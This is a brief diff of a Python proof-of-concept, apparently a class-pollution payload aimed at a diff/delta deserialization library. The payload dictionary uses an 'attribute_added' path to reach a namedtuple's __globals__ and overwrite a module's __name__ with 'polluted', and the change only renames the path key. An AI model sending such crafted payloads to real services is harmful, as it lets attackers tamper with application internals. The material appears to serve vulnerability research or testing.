@@ -5,8 +5,8 @@ import sys
 # Payload
 payload = {
   "attribute_added" : {
-    "root['function']": namedtuple,
-    "root['function'].'__globals__'['_sys'].'__name__'": "polluted",
+    "root['x']": namedtuple,
+    "root['x'].'__globals__'['_sys'].'__name__'": "polluted",
   }
 }
 
